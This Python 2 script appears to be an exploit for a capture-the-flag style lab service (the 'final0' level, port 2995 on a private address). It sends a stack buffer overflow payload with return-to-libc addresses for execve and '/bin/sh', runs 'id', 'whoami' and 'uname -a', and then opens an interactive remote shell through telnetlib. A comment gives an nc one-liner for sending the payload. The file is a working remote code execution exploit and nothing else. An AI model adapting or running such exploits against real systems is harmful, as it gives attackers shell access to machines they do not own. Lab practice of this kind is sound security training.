import struct
import socket
import telnetlib

HOST = '172.16.75.129'
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

EXECVE = struct.pack("I", 0x08048c0c)
BINSH = struct.pack("I", 0xb7fb63bf)
padding = "\x00" + 'a'*531

payload = padding + EXECVE + "aaaa" + BINSH + "\x00"*8 #eip + "\x90"*100 + SC + "\n"
print payload #if we dont use socket, COMMENT lines below and type in terminal 
              #  "(python final0.py; cat) | nc [HOST] [PORT]"

s.send(payload + "\n")
s.send('id\n')
s.send('whoami\n')
s.send('uname -a\n')
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()

